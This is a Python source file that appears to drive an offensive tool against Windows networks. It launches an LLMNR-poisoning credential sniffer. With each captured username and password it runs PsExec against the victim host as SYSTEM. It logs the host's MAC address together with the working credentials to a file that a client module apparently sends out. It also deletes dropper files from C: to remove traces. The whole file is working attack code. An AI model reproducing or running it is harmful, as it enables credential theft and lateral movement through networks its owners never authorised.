import multiprocessing
import os
import subprocess
import time
import LlmnrPoisining.hashcat.sniffCredentials as sniffCredentials
import LateralMovement.transfer as transfer
import communication.ClientSide.client as client
import getmac


def sniff(conn2):
    os.chdir('./LlmnrPoisining/hashcat/')
    sniffCredentials.main(conn2)


def comm():
    os.chdir('communication/ClientSide/')
    client.main()


def main():
    if os.path.isfile('c:/FileTransfer.py'):
        os.remove('c:/FileTransfer.py')
    if os.path.isfile('c:/initiator.py'):
        os.remove('c:/initiator.py')
    sniffer_conn, conn2 = multiprocessing.Pipe()
    sniffer = multiprocessing.Process(target=sniff, args=(conn2,))
    sniffer.start()
    client = multiprocessing.Process(target=comm)
    t = time.time()
    while True:
        if sniffer_conn.poll():
            data = sniffer_conn.recv()
            print(data)
            os.chdir('./LateralMovement')
            privilege = os.popen(r'Psexec \\' + data[2] + ' -u ' + data[0] + ' -p ' + data[1] + ' -i -s ipconfig')
            print(privilege.read())
            privilege = privilege.close()
            os.chdir('..')
            if (privilege == None or privilege == 0):
                mac_address = str(getmac.get_mac_address(ip=data[2]))
                if (os.path.exists('communication/ClientSide/output/default.txt')):
                    mode = 'a'
                else:
                    mode = 'w'
                with open('communication/ClientSide/output/default.txt', mode) as f:
                    f.write(f'{mac_address}:{data[0]}:{data[1]}\n')

            print(str(privilege))

            # result = transfer.main(*data)
            # if(result):
            #
            # else:
            #     print(result)

        if (time.time() - t > 5 and not client.is_alive()):
            print('comm')
            client.start()
            t = time.time()


if __name__ == '__main__':
    main()
